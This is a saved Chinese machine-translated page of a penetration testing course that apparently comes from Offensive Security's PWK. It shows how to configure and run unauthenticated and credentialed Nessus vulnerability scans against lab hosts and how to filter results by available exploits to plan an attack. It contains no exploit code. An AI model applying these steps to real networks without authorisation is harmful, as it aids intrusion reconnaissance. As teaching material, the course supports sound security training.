
<!-- saved from url=(0051)https://translate.googleusercontent.com/translate_f -->
<html lang="zh-CN" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="google" content="notranslate">
<script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
(function(){function e(g){this.t={};this.tick=function(h,k,f){this.t[h]=[void 0!=f?f:(new Date).getTime(),k];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(m){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var l=0<d?new e(d):new e;window.jstiming={Timer:e,load:l};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;0<b&&d>=
b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{a=null,window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b))),null==a&&window.gtbExternal&&(a=window.gtbExternal.pageT()),null==a&&window.external&&(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))),a&&(window.jstiming.pt=a)}catch(g){}})();}).call(window);
</script><script src="./o3cp[221-320]_files/translate_c.js.下载"></script><style type="text/css" abt="234"></style><script>_intlStrings._originalText = "英语原文:";_intlStrings._interfaceDirection="ltr";_intlStrings._interfaceAlign="left";_intlStrings._langpair="en|zh-CN";_intlStrings._feedbackUrl="https://translate.google.com/translate_suggestion";_intlStrings._currentBy="当前的翻译是由%2$s在 %1$s完成的";_intlStrings._unknown="佚名译者";_intlStrings._suggestTranslation="更好的翻译建议"  ;_intlStrings._submit="贡献力量";_intlStrings._suggestThanks="感谢您为 Google 翻译提供翻译建议。";_intlStrings._reverse=false;_intlStrings._staticContentPath="https://www.gstatic.com/translate/infowindow/";</script><style type="text/css">.google-src-text {display: none !important} .google-src-active-text {display: block!important;color:black!important; font-size:12px!important;font-family:arial,sans-serif!important}.google-src-active-text a {font-size:12px!important}.google-src-active-text a:link {color:#00c!important;text-decoration:underline!important}.google-src-active-text a:visited {color:purple!important;text-decoration:underline!important}.google-src-active-text a:active {color:red!important;text-decoration:underline!important}</style><meta http-equiv="X-Translated-By" content="Google"><link href="https://translate.googleusercontent.com/o3cp[221-320].pdf" hreflang="en" rel="alternate machine-translated-from"><link href="./o3cp[221-320]_files/css" rel="stylesheet" type="text/css"><!--<base href="" target="_top">--><base href="." target="_top">

<title>在端口扫描部分，我们将端口扫描范围设置为显示“0-65535”以扫描所有端口：在这个场景中</title>
<link type="text/css" rel="stylesheet" charset="UTF-8" href="./o3cp[221-320]_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./o3cp[221-320]_files/main_zh-CN.js.下载"></script><script>//console.log('a')
</script><script>//remove baidu search ad
var _countAA = 0
function doBBBd(){}
doBBBd()
document.addEventListener('keyup', function(){_countAA-=10;doBBBd()}, false)
document.addEventListener('click', function(){_countAA-=10;doBBBd()}, false)

</script><script type="text/javascript" charset="UTF-8" src="./o3cp[221-320]_files/element_main.js.下载"></script><link rel="stylesheet" type="text/css" href="./o3cp[221-320]_files/iw_sprite.css"></head><body bgcolor="#ffffff" vlink="blue" link="blue">
        <style>
          .spinner-container {
            width:25%;
            top:20px;
            left:50%;
            margin-left:-12.5%;
            border-radius:8px;
            position:fixed;
            text-align:center;
            box-shadow:0 0 10px rgba(0,0,0,0.24);
            background:#fff;
            overflow:hidden;
          }

          .spinner-container p{
            font-family:'Roboto', Arial, sans-serif;
            color:rgba(0,0,0,0.87);
            margin:12px 0 16px 0;
            padding:0;
            font-size:12px;
          }

          .spinner-container img{
            width:22px;
            height:22px;
            margin:16px 0 0;
            padding:0;
          }
        </style>
        <div class="spinner-container notranslate" id="gt-dt-spinner" style="display: none;">
         <img src="./o3cp[221-320]_files/progress_spinner_color_20dp@2x.gif">
         <p>正在翻译...</p>
        </div>
      <iframe src="./o3cp[221-320]_files/translate_un.html" width="0" height="0" frameborder="0" style="width:0px;height:0px;border:0px;display:none;"></iframe>
<table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 页</font></font></b></a></font></td></tr></tbody></table><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:1285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:1285;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:1285;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:648;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 58：选择新的端口扫描选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分，我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描范围</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为显示“0-65535”以便扫描</font></font></nobr></div>
<div style="position:absolute;top:699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有端口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1125;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 59：配置扫描器以扫描所有端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们选择了一个扫描定义，它将扫描所有 TCP 端口，但不扫描 UDP 端口。</font></font></nobr></div>
<div style="position:absolute;top:1175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这会提高扫描速度，但我们可能会错过目标上运行的关键服务。</font></font></nobr></div>
<div style="position:absolute;top:1194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在交战过程中，我们必须权衡目标网络的稳定性，目标的范围，</font></font></nobr></div>
<div style="position:absolute;top:1214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参与的持续时间，以及配置我们的端口扫描选项时的许多其他因素。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:1363;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="2"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:1396;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:2473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:2473;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:2473;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">222</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在扫描定义的配置过程中，我们没有配置任何凭据，这意味着</font></font></nobr></div>
<div style="position:absolute;top:1511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此扫描将在未经身份验证的情况下运行。</font><font style="vertical-align: inherit;">此外，我们接受了</font><i><font style="vertical-align: inherit;">基本网络</font></i><font style="vertical-align: inherit;">下的默认值</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:1530;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Scan</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这意味着将不会启用用户凭据的暴力破解。</font><font style="vertical-align: inherit;">如果我们查看其他选项</font></font></nobr></div>
<div style="position:absolute;top:1550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在基本网络扫描下，我们可以验证扫描是否会针对目标运行通用检查</font></font></nobr></div>
<div style="position:absolute;top:1569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spectre 和 Meltdown</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等其他模板形成对比</font><font style="vertical-align: inherit;">，后者包括特定的漏洞检查。</font></font></nobr></div>
<div style="position:absolute;top:1588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，像这样配置的扫描在网络流量级别上将非常明显，因为</font></font></nobr></div>
<div style="position:absolute;top:1608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它扫描所有端口并搜索所有适用的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:1640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经完全审查了所有配置选项并理解（至少在</font></font></nobr></div>
<div style="position:absolute;top:1660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级）扫描仪将要做什么，我们可以继续运行我们的第一次扫描。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1694;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.4 使用 Nessus 进行未经身份验证的扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们准备好运行第一次未经身份验证的扫描时，我们单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旁边的箭头</font><font style="vertical-align: inherit;">，然后</font></font></nobr></div>
<div style="position:absolute;top:1752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2078;left:373"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 60：启动扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最初，扫描的状态为“正在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（图 61）。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2346;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 61：正在进行的扫描状态</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描完成后，状态将更改为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已完成</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（图 62）。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:2551;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="3"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:2584;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:3661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:3661;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:3661;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">223</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2833;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 62：正在进行的扫描状态</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描时间会因许多因素而异，包括扫描配置和扫描速度。</font></font></nobr></div>
<div style="position:absolute;top:2883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络。</font></font></nobr></div>
<div style="position:absolute;top:2916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在“我的扫描”屏幕中，我们可以单击扫描名称“Gamma - Basic”，以显示</font></font></nobr></div>
<div style="position:absolute;top:2935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描过程中发现的主机和潜在漏洞的分解：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3373;left:363"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 63：查看扫描概览</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论我们扫描一台主机还是多台主机，我们都可以单击 IP 地址或主机名来显示</font></font></nobr></div>
<div style="position:absolute;top:3424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为该目标发现的漏洞，如图 64 所示： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:3739;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 4 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:3772;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:4849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:4849;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:4849;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">224</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4418;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 64：查看发现的漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过严重性、可利用性、CVE 等来过滤这些漏洞。</font><font style="vertical-align: inherit;">要显示</font></font></nobr></div>
<div style="position:absolute;top:4468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最有可能导致目标入侵的漏洞，我们可以点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过滤器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并更改</font></font></nobr></div>
<div style="position:absolute;top:4488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果面板上的下拉菜单为“Exploit Available”，接受默认值“is equal to”和</font></font></nobr></div>
<div style="position:absolute;top:4507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“真的”。</font><font style="vertical-align: inherit;">配置完成后，我们点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apply</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4795;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 65：利用漏洞过滤漏洞 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:4927;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="5"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4960;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:6037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:6037;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:6037;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">225</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:5050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.4.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将显示由 Nessus 定义的组中的漏洞列表：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5336;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 66：带有组的漏洞列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然此分组很有用，但我们将单击表格右上角的齿轮图标，然后单击</font></font></nobr></div>
<div style="position:absolute;top:5386;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用组</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这将提供一个首选的输出格式，在单个文件上列出所有漏洞</font></font></nobr></div>
<div style="position:absolute;top:5406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页面，按严重性排序：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5683;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 67：禁用分组</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种输出格式非常适合我们的目的，因为它显示了一种潜在的路线图</font></font></nobr></div>
<div style="position:absolute;top:5733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击目标，首先显示风险最高的漏洞： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:6115;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6148;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:7225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:7225;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:7225;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">226</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6641;left:377"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 68：禁用分组</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当然，有些条目可能代表误报，这就是为什么审查</font></font></nobr></div>
<div style="position:absolute;top:6692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描数据并手动测试扫描结果。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6726;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.4.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 按照上述步骤创建您自己的 Gamma 未经身份验证的扫描。</font></font></nobr></div>
<div style="position:absolute;top:6784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在 Wireshark 打开的情况下运行扫描并确定扫描仪执行的步骤</font></font></nobr></div>
<div style="position:absolute;top:6804;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成扫描。</font></font></nobr></div>
<div style="position:absolute;top:6832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 查看扫描结果。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6866;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.5 Nessus 认证扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过执行以下操作来生成更详细的信息并减少误报</font></font></nobr></div>
<div style="position:absolute;top:6923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证扫描，这需要有效的目标凭据。</font><font style="vertical-align: inherit;">为了证明一个的价值</font></font></nobr></div>
<div style="position:absolute;top:6943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经过身份验证的扫描，我们将对我们的 Debian 实验室客户端运行一个。</font><font style="vertical-align: inherit;">但是请记住，作为</font></font></nobr></div>
<div style="position:absolute;top:6962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试人员在没有明确的情况下，我们不会在大多数情况下执行经过身份验证的扫描</font></font></nobr></div>
<div style="position:absolute;top:6981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于潜在的原因，目标网络管理员的许可和清晰的沟通</font></font></nobr></div>
<div style="position:absolute;top:7001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生产系统意外中断的风险更高。</font></font></nobr></div>
<div style="position:absolute;top:7034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新建扫描”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮开始扫描。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:7303;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="7"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 7 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:7336;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:8413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:8413;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:8413;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">227</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:7713;left:384"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 69：创建扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使所有 Nessus 模板都接受用户凭据，我们仍将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Credentialed Patch Audit</font></font></i></nobr></div>
<div style="position:absolute;top:7764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描模板，预先配置为对目标执行本地安全检查。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:7783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模板不仅会扫描缺少的操作系统级别的补丁，还会扫描</font></font></nobr></div>
<div style="position:absolute;top:7803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过时的应用程序可能容易受到特权升级等媒介的攻击。</font></font></nobr></div>
<div style="position:absolute;top:7835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Credentialed Patch Audit</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8219;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 70：选择“Credentialed Patch Audit”扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再一次，我们将为扫描提供一个名称并设置目标。</font><font style="vertical-align: inherit;">请注意您的 Debian 的 IP</font></font></nobr></div>
<div style="position:absolute;top:8270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端会有所不同。</font><font style="vertical-align: inherit;">请参阅学生控制面板以获取正确的 Debian 客户端 IP。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:8491;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="8"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 8 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:8524;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:9601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:9601;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:9601;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">228</font></font></nobr></div>
</span></font>
